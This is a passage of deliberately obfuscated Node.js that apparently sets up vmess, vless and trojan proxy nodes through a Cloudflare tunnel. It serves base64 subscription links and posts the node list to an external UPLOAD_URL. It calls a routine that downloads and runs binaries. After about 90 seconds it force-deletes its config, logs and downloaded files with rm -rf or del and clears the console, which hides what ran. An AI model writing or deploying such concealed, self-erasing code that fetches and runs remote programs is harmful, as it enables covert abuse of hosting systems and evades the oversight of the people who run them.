_0x5e3ae3[_0x14f883(0x12c)][_0x14f883(_0x5d2c5d._0x32e268)]+'_'+_0x5e3ae3[_0x14f883(_0x5d2c5d._0xb787ea)][_0x14f883(_0x5d2c5d._0x132108)];}catch(_0x5ed8b4){}}return'Unknown';}async function _0x271039(_0xc547e7){const _0x206b7b=await _0x3376a5(),_0x2ebe06=NAME?NAME+'-'+_0x206b7b:_0x206b7b;return new Promise(_0x32ce56=>{const _0x198fce={_0x43675d:0x169,_0x20ff5e:0x1b2,_0x4ede55:0x1b7,_0x366422:0x179,_0x2877b4:0x19e,_0x38a10b:0x188,_0x2cf049:0x179,_0x4d7a85:0x1b1,_0x13fc46:0x162,_0x208d78:0x1a7,_0x52f6f0:0x142},_0x4b618e={_0xcb2ca1:0x1e5};setTimeout(()=>{const _0x2d64ca=_0x130c,_0x152be4={'v':'2','ps':''+_0x2ebe06,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2d64ca(_0x198fce._0x43675d),'net':'ws','type':_0x2d64ca(_0x198fce._0x43675d),'host':_0xc547e7,'path':'/vmess-argo?ed=2560','tls':_0x2d64ca(0x1a6),'sni':_0xc547e7,'alpn':'','fp':_0x2d64ca(_0x198fce._0x20ff5e)},_0x50fd22=_0x2d64ca(_0x198fce._0x4ede55)+UUID+'@'+CFIP+':'+CFPORT+_0x2d64ca(0x178)+_0xc547e7+'&fp=firefox&type=ws&host='+_0xc547e7+_0x2d64ca(0x1ab)+_0x2ebe06+'\x0a\x0avmess://'+Buffer[_0x2d64ca(_0x198fce._0x366422)](JSON[_0x2d64ca(_0x198fce._0x2877b4)](_0x152be4))['toString'](_0x2d64ca(0x1ad))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xc547e7+_0x2d64ca(0x158)+_0xc547e7+_0x2d64ca(_0x198fce._0x38a10b)+_0x2ebe06+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x2d64ca(_0x198fce._0x2cf049)](_0x50fd22)[_0x2d64ca(_0x198fce._0x4d7a85)]('base64')),fs[_0x2d64ca(_0x198fce._0x13fc46)](subPath,Buffer['from'](_0x50fd22)['toString']('base64')),console[_0x2d64ca(0x18a)](FILE_PATH+_0x2d64ca(_0x198fce._0x208d78)),uploadNodes(),app[_0x2d64ca(_0x198fce._0x52f6f0)]('/'+SUB_PATH,(_0x377560,_0x2ed563)=>{const _0x44e2f4=_0x2d64ca,_0x56f219=Buffer['from'](_0x50fd22)[_0x44e2f4(0x1b1)](_0x44e2f4(0x1ad));_0x2ed563[_0x44e2f4(0x1d1)]('Content-Type',_0x44e2f4(_0x4b618e._0xcb2ca1)),_0x2ed563['send'](_0x56f219);}),_0x32ce56(_0x50fd22);},0x7d0);});}}async function uploadNodes(){const _0x5e9396={_0x38119c:0x13b,_0x79710e:0x1cc,_0x46b51a:0x1d4,_0x2519bf:0x1d4,_0xbe60e:0x17f,_0x12eb26:0x13b},_0x3a2035=_0xce4c1e;if(UPLOAD_URL&&PROJECT_URL){const _0x9744e5=PROJECT_URL+'/'+SUB_PATH,_0x21c3e4={'subscription':[_0x9744e5]};try{const _0x17faf7=await axios[_0x3a2035(_0x5e9396._0x38119c)](UPLOAD_URL+_0x3a2035(0x19b),_0x21c3e4,{'headers':{'Content-Type':'application/json'}});return _0x17faf7&&_0x17faf7[_0x3a2035(0x1e4)]===0xc8?(console[_0x3a2035(0x18a)](_0x3a2035(_0x5e9396._0x79710e)),_0x17faf7):null;}catch(_0x33d559){if(_0x33d559[_0x3a2035(_0x5e9396._0x46b51a)]){if(_0x33d559[_0x3a2035(_0x5e9396._0x2519bf)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x22bc66=fs[_0x3a2035(0x19a)](listPath,_0x3a2035(0x19f)),_0xd5e808=_0x22bc66[_0x3a2035(0x17b)]('\x0a')['filter'](_0x3e2446=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3e2446));if(_0xd5e808[_0x3a2035(_0x5e9396._0xbe60e)]===0x0)return;const _0x535210=JSON['stringify']({'nodes':_0xd5e808});try{const _0x2fe596=await axios[_0x3a2035(_0x5e9396._0x12eb26)](UPLOAD_URL+'/api/add-nodes',_0x535210,{'headers':{'Content-Type':'application/json'}});return _0x2fe596&&_0x2fe596[_0x3a2035(0x1e4)]===0xc8?(console[_0x3a2035(0x18a)](_0x3a2035(0x17e)),_0x2fe596):null;}catch(_0xdefff7){return null;}}else return;}}function cleanFiles(){const _0x98e5c2={_0x12a480:0x180},_0x441774={_0x48f52b:0x16f},_0xf9b55={_0x1e5afd:0x1aa,_0x2178ff:0x147};setTimeout(()=>{const _0x3650cc=_0x130c,_0x37030c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x37030c[_0x3650cc(0x196)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x37030c['push'](phpPath);process[_0x3650cc(0x13d)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x37030c['join']('\x20')+_0x3650cc(0x1ac),_0x5f0e20=>{const _0x7e5ac4=_0x3650cc;console[_0x7e5ac4(_0xf9b55._0x1e5afd)](),console[_0x7e5ac4(0x18a)](_0x7e5ac4(_0xf9b55._0x2178ff)),console['log'](_0x7e5ac4(0x16f));}):exec('rm\x20-rf\x20'+_0x37030c[_0x3650cc(0x14e)]('\x20')+_0x3650cc(_0x98e5c2._0x12a480),_0x538f1c=>{const _0x392061=_0x3650cc;console['clear'](),console['log'](_0x392061(0x147)),console['log'](_0x392061(_0x441774._0x48f52b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xb111b3={_0x37537d:0x163,_0x2f2049:0x16c,_0x1272f7:0x140,_0x421a78:0x150},_0x2b4556=_0xce4c1e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2b4556(0x18a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x598c28=await axios[_0x2b4556(0x13b)](_0x2b4556(_0xb111b3._0x37537d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2b4556(0x168)}});return console['log'](_0x2b4556(_0xb111b3._0x2f2049)),_0x598c28;}catch(_0x2b1834){return console[_0x2b4556(_0xb111b3._0x1272f7)](_0x2b4556(_0xb111b3._0x421a78)+_0x2b1834['message']),null;}}async function startserver(){const _0x12ed4a=_0xce4c1e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x32b45c){console['error'](_0x12ed4a(0x187),_0x32b45c);}}startserver()['catch'](_0x411023=>{const _0x3f2676={_0x377688:0x140},_0x354a55=_0xce4c1e;console[_0x354a55(_0x3f2676._0x377688)](_0x354a55(0x1be),_0x411023);}),app[_0xce4c1e(0x160)](PORT,()=>console[_0xce4c1e(0x18a)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
